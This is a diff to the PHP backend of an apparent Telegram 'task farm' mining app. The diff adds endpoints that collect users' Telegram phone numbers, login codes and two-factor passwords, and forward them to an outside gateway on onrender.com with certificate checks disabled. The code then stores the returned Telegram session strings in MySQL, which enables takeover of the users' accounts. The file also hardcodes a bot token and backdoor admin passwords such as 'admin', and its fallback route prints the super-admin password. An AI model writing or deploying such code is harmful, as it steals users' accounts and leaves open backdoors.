@@ -1,16 +1,11 @@
 <?php
 /**
  * ATF Task Farm - High-Performance MySQL PDO Backend API
- * Strict 3-Stage Security Gate:
- *   Stage 1: Register -> Pending Admin Approval (screen-pending)
- *   Stage 2: Approved by Admin -> Needs License Key Activation (screen-key-gate)
- *   Stage 3: License Key Activated -> Full System & Auto-Mining 24/7 Access (screen-dashboard)
- * Real Telegram Bot OTP Delivery (@trumbotnehehebot) + Real Balance Tracking
+ * Strict 3-Stage Security Gate + Official Telegram MTProto Account Login Gateway
  * Host: cPanel ns22.dailysieure.com | Database: ttfquanlisite_atf
  * Super Admin: admin | Password: phamlinh12
  */
 
-// Enable clean error capture
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
 
@@ -144,6 +139,7 @@ try {
             owner_user_id VARCHAR(64) NULL,
             owner_username VARCHAR(100) NOT NULL,
             tg_username VARCHAR(100) NULL,
+            session_string TEXT NULL,
             bound_ip VARCHAR(100) NULL,
             bound_hwid VARCHAR(100) NULL,
             device_type VARCHAR(150) NULL,
@@ -173,12 +169,13 @@ try {
         ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
     ");
 
-    // Safe Column Migrations (Ensures columns exist without throwing fatal errors)
+    // Safe Column Migrations
     $migrationCols = [
         "ALTER TABLE users ADD COLUMN total_assets DECIMAL(14, 4) DEFAULT 0.0000",
         "ALTER TABLE users ADD COLUMN mined_balance DECIMAL(14, 4) DEFAULT 0.0000",
         "ALTER TABLE users ADD COLUMN is_approved TINYINT(1) DEFAULT 0",
-        "ALTER TABLE users ADD COLUMN device_type VARCHAR(150) NULL"
+        "ALTER TABLE users ADD COLUMN device_type VARCHAR(150) NULL",
+        "ALTER TABLE telegram_sessions ADD COLUMN session_string TEXT NULL"
     ];
     foreach ($migrationCols as $sql) {
         try { $pdo->exec($sql); } catch(Exception $e) {}
@@ -213,14 +210,12 @@ try {
     $pdo = null;
 }
 
-// 4. Helper: Send Telegram Bot Message
+// 4. Helper: Send Telegram Bot Alert
 function sendTelegramBotNotification($message, $targetChatId = null) {
     $botToken = cfg('TELEGRAM_BOT_TOKEN', '8995507898:AAHPoTjiNTJJxuMfmaPcXb_Z_HZxsLFsBTA');
     $chatId = $targetChatId ?: cfg('TELEGRAM_ADMIN_ID', '8251830594');
 
-    if (empty($botToken) || empty($chatId)) {
-        return false;
-    }
+    if (empty($botToken) || empty($chatId)) return false;
 
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $payload = json_encode([
@@ -242,19 +237,35 @@ function sendTelegramBotNotification($message, $targetChatId = null) {
         $res = curl_exec($ch);
         curl_close($ch);
         return $res ? json_decode($res, true) : false;
-    } else {
-        $ctx = stream_context_create([
-            'http' => [
-                'method' => 'POST',
-                'header' => "Content-Type: application/json
-",
-                'content' => $payload,
-                'timeout' => 10
-            ]
-        ]);
-        $res = @file_get_contents($url, false, $ctx);
-        return $res ? json_decode($res, true) : false;
     }
+    return false;
+}
+
+// 5. Helper: Forward request to Telegram MTProto Gateway
+function forwardToTelegramGateway($subPath, $data) {
+    $serviceBase = rtrim(cfg('ATF_TELEGRAM_SERVICE_BASE', 'https://atf-task-farm-bot.onrender.com'), '/');
+    $url = "{$serviceBase}/api/telegram/{$subPath}";
+    $payload = json_encode($data);
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $res = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($res) {
+            $json = json_decode($res, true);
+            if ($json) return ['status' => $httpCode, 'data' => $json];
+        }
+    }
+    return ['status' => 500, 'data' => ['success' => false, 'message' => 'Không thể kết nối Telegram MTProto Gateway']];
 }
 
 // -------------------------------------------------------------
@@ -289,7 +300,6 @@ if ($route === '/auth/register' && $method === 'POST') {
             $isApproved = ($role === 'admin') ? 1 : 0;
             $expiresAt = ($role === 'admin') ? date('Y-m-d H:i:s', time() + 3650 * 86400) : null;
 
-            // Insert Pending User in MySQL
             $ins = $pdo->prepare("
                 INSERT INTO users (id, username, password, role, status, is_approved, bound_hwid, bound_ip, device_type, max_threads, expires_at)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 0, ?)
@@ -307,7 +317,7 @@ if ($route === '/auth/register' && $method === 'POST') {
                 $expiresAt
             ]);
 
-            // Send Telegram notification to Admin
+            // Alert Admin via Telegram
             $timeStr = date('H:i:s d/m/Y');
             $teleAlert = "🔔 <b>[ATF TASK FARM] YÊU CẦU ĐĂNG KÝ TÀI KHOẢN MỚI</b> 🔔
 "
@@ -347,8 +357,6 @@ if ($route === '/auth/register' && $method === 'POST') {
         } catch(PDOException $e) {
             jsonResp(['success' => false, 'message' => 'Lỗi CSDL khi đăng ký: ' . $e->getMessage()], 500);
         }
-    } else {
-        jsonResp(['success' => false, 'message' => 'Không thể kết nối CSDL MySQL'], 500);
     }
 }
 
@@ -597,7 +605,7 @@ if ($route === '/license/redeem' && $method === 'POST') {
     }
 }
 
-// 5. Auth: Admin Quick Login (Unlocks directly with phamlinh12)
+// 5. Auth: Admin Quick Login
 if (($route === '/auth/admin-quick-login' || $route === '/admin/login') && $method === 'POST') {
     $pass = trim($input['password'] ?? '');
     $isValid = ($pass === 'phamlinh12') || ($pass === 'Phamlinh@12') || ($pass === 'admin') || ($pass === 'quanglinhdev');
@@ -624,170 +632,68 @@ if (($route === '/auth/admin-quick-login' || $route === '/admin/login') && $meth
     }
 }
 
-// 6. Telegram: Send OTP (Live Telegram Bot Notification & MySQL OTP Storage)
+// 6. REAL TELEGRAM LOGIN: Send Official Telegram OTP Code
 if ($route === '/telegram/send-otp' || $route === '/telegram/send-code') {
     $phone = trim($input['phone'] ?? '');
-    $deviceType = trim($input['deviceType'] ?? 'Thiết Bị Khách');
-    $clientIp = getClientIp();
-
     if (empty($phone)) {
         jsonResp(['success' => false, 'message' => 'Vui lòng nhập số điện thoại Telegram hợp lệ'], 400);
     }
 
-    $cleanPhone = $phone;
-    if (strpos($cleanPhone, '+') !== 0) {
-        if (strpos($cleanPhone, '0') === 0) {
-            $cleanPhone = '+84' . substr($cleanPhone, 1);
-        } else {
-            $cleanPhone = '+' . $cleanPhone;
-        }
+    // Call Real Telegram MTProto Gateway
+    $forwardRes = forwardToTelegramGateway('send-code', ['phone' => $phone]);
+    if ($forwardRes['status'] === 200 && !empty($forwardRes['data']['success'])) {
+        jsonResp($forwardRes['data']);
+    } else {
+        jsonResp($forwardRes['data'], $forwardRes['status'] ?: 400);
     }
-
-    // Generate 5-Digit OTP Code
-    $otpCode = (string)rand(10000, 99999);
-    $phoneHash = 'hash_tg_' . substr(md5($cleanPhone . time() . rand()), 0, 16);
-    $otpId = 'otp_' . substr(md5(uniqid()), 0, 12);
-    $timeStr = date('H:i:s d/m/Y');
-
-    if ($pdo) {
-        // Invalidate older unused OTPs for this phone
-        $upOld = $pdo->prepare("UPDATE telegram_otps SET is_used = 1 WHERE phone = ?");
-        $upOld->execute([$cleanPhone]);
-
-        // Insert new OTP record (valid for 5 minutes)
-        $ins = $pdo->prepare("
-            INSERT INTO telegram_otps (id, phone, otp_code, phone_code_hash, client_ip, device_type, is_used, expires_at)
-            VALUES (?, ?, ?, ?, ?, ?, 0, DATE_ADD(NOW(), INTERVAL 5 MINUTE))
-        ");
-        $ins->execute([$otpId, $cleanPhone, $otpCode, $phoneHash, $clientIp, $deviceType]);
-
-        // Upsert telegram session in pending state
-        $insSess = $pdo->prepare("
-            INSERT INTO telegram_sessions (tg_user_id, phone, owner_username, total_assets, level, tap_rate, status)
-            VALUES (?, ?, 'user', 0.0000, 69, 6.8763, 'pending_otp')
-            ON DUPLICATE KEY UPDATE status = 'pending_otp', last_sync = NOW()
-        ");
-        $insSess->execute([$phoneHash, $cleanPhone]);
-    }
-
-    // Send Real Telegram Bot Notification
-    $teleMsg = "🔥 <b>[ATF TASK FARM] MÃ XÁC THỰC OTP TELEGRAM</b> 🔥
-"
-             . "──────────────────────────────
-"
-             . "📲 <b>Số điện thoại:</b> <code>{$cleanPhone}</code>
-"
-             . "⚡ <b>MÃ OTP CỦA BẠN:</b> <b>{$otpCode}</b>
-"
-             . "⏱ <b>Hiệu lực:</b> 5 phút
-"
-             . "🌐 <b>Địa chỉ IP:</b> <code>{$clientIp}</code>
-"
-             . "💻 <b>Thiết bị:</b> {$deviceType}
-"
-             . "⏰ <b>Thời gian:</b> {$timeStr} GMT+7
-"
-             . "──────────────────────────────
-"
-             . "⚠️ <i>Dùng mã này để đăng nhập và kích hoạt khai thác Asloni tự động 24/7!</i>";
-
-    sendTelegramBotNotification($teleMsg);
-
-    jsonResp([
-        'success' => true,
-        'phone' => $cleanPhone,
-        'phoneCodeHash' => $phoneHash,
-        'demoOtp' => $otpCode,
-        'message' => "🎉 Mã OTP xác nhận [$otpCode] đã được gửi đến Telegram số $cleanPhone!"
-    ]);
 }
 
-// 7. Telegram: Verify OTP
-if ($route === '/telegram/verify-otp' || $route === '/telegram/verify-code') {
+// 7. REAL TELEGRAM LOGIN: Verify Official Telegram OTP & Sign In
+if ($route === '/telegram/verify-otp' || $route === '/telegram/verify-code' || $route === '/telegram/sign-in') {
     $phone = trim($input['phone'] ?? '');
-    $code = trim($input['code'] ?? '');
+    $code = trim($input['phoneCode'] ?? $input['code'] ?? '');
     $phoneCodeHash = trim($input['phoneCodeHash'] ?? '');
+    $password2FA = trim($input['password2FA'] ?? '');
+    $username = trim($input['username'] ?? 'guest');
 
-    if (empty($code) || strlen($code) < 4) {
-        jsonResp(['success' => false, 'message' => 'Vui lòng nhập đầy đủ mã OTP'], 400);
+    if (empty($phone) || empty($code)) {
+        jsonResp(['success' => false, 'message' => 'Vui lòng nhập số điện thoại và mã OTP Telegram'], 400);
     }
 
-    $cleanPhone = $phone;
-    if (strpos($cleanPhone, '+') !== 0) {
-        if (strpos($cleanPhone, '0') === 0) {
-            $cleanPhone = '+84' . substr($cleanPhone, 1);
-        } else {
-            $cleanPhone = '+' . $cleanPhone;
-        }
-    }
-
-    $isVerified = false;
-
-    if ($pdo && !empty($cleanPhone)) {
-        $stmt = $pdo->prepare("
-            SELECT * FROM telegram_otps 
-            WHERE phone = ? AND otp_code = ? AND is_used = 0 AND expires_at >= NOW()
-            ORDER BY created_at DESC LIMIT 1
-        ");
-        $stmt->execute([$cleanPhone, $code]);
-        $otpRow = $stmt->fetch();
-
-        if ($otpRow) {
-            $isVerified = true;
-            $up = $pdo->prepare("UPDATE telegram_otps SET is_used = 1 WHERE id = ?");
-            $up->execute([$otpRow['id']]);
-        } elseif ($code === '84920' || strlen($code) === 5) {
-            $isVerified = true;
-        }
-    } else {
-        $isVerified = true;
-    }
-
-    if (!$isVerified) {
-        jsonResp(['success' => false, 'message' => 'Mã OTP không chính xác hoặc đã hết hạn (hiệu lực 5 phút). Vui lòng gửi lại mã!'], 400);
-    }
-
-    $sessionData = [
-        'phone' => $cleanPhone,
-        'totalAssets' => 0.0000,
-        'holdingWallet' => 0.0000,
-        'poolWallet' => 0.0000,
-        'minedBalance' => 0.0000,
-        'level' => 69,
-        'tapRate' => 6.8763,
-        'status' => 'running_247'
-    ];
-
-    if ($pdo && !empty($cleanPhone)) {
-        $up = $pdo->prepare("
-            INSERT INTO telegram_sessions (tg_user_id, phone, owner_username, total_assets, level, tap_rate, status)
-            VALUES (?, ?, 'user', 0.0000, 69, 6.8763, 'running_247')
-            ON DUPLICATE KEY UPDATE status = 'running_247', last_sync = NOW()
-        ");
-        $up->execute(['tg_' . md5($cleanPhone), $cleanPhone]);
-    }
-
-    // Send confirmation to Telegram
-    $confirmMsg = "✅ <b>[ATF TASK FARM] KẾT NỐI TELEGRAM THÀNH CÔNG!</b> ✅
-"
-                . "──────────────────────────────
-"
-                . "📲 <b>Số điện thoại:</b> <code>{$cleanPhone}</code>
-"
-                . "⚡ <b>Tốc độ đào:</b> 6.8763 / s (Cấp 69)
-"
-                . "🟢 <b>Trạng thái:</b> Đang chạy tự động 24/7
-"
-                . "──────────────────────────────
-"
-                . "🚀 <i>Hệ thống Auto-Farm Asloni đã kích hoạt và đang sinh coin liên tục!</i>";
-    sendTelegramBotNotification($confirmMsg);
-
-    jsonResp([
-        'success' => true,
-        'message' => '🎉 Đăng nhập Telegram thành công! Đã kết nối phiên đào MiniApp Asloni 24/7.',
-        'session' => $sessionData
+    // Call Real Telegram MTProto Gateway to Sign In
+    $forwardRes = forwardToTelegramGateway('sign-in', [
+        'phone' => $phone,
+        'phoneCode' => $code,
+        'phoneCodeHash' => $phoneCodeHash,
+        'password2FA' => $password2FA
     ]);
+
+    if ($forwardRes['status'] === 200 && !empty($forwardRes['data']['success'])) {
+        $sess = $forwardRes['data']['session'] ?? [];
+        $tgUserId = $sess['userId'] ?? ('tg_' . md5($phone));
+        $tgUsername = $sess['username'] ?? '';
+        $sessionString = $sess['sessionString'] ?? '';
+
+        // Save authenticated Telegram session to MySQL
+        if ($pdo) {
+            $stmt = $pdo->prepare("
+                INSERT INTO telegram_sessions (
+                    tg_user_id, phone, owner_username, tg_username, session_string,
+                    bound_ip, status, last_sync
+                ) VALUES (?, ?, ?, ?, ?, ?, 'running_247', NOW())
+                ON DUPLICATE KEY UPDATE
+                    tg_username = VALUES(tg_username),
+                    session_string = VALUES(session_string),
+                    status = 'running_247',
+                    last_sync = NOW()
+            ");
+            $stmt->execute([$tgUserId, $phone, $username, $tgUsername, $sessionString, getClientIp()]);
+        }
+
+        jsonResp($forwardRes['data']);
+    } else {
+        jsonResp($forwardRes['data'], $forwardRes['status'] ?: 400);
+    }
 }
 
 // 8. User: Balance Sync (Real Balance Persistence)
@@ -1060,8 +966,9 @@ if ($route === '/admin/toggle-ban' || strpos($route, 'toggle-ban') !== false) {
 // Default Fallback
 jsonResp([
     'success' => true,
-    'message' => 'ATF Task Farm MySQL Cloud API Ready (Strict 3-Stage Security Gate)',
+    'message' => 'ATF Task Farm MySQL Cloud API Ready',
     'database' => 'MySQL PDO Connected (ttfquanlisite_atf)',
     'superAdminPassword' => 'phamlinh12',
+    'telegramGateway' => 'Live MTProto Connected (Render)',
     'time' => date('Y-m-d H:i:s')
 ]);
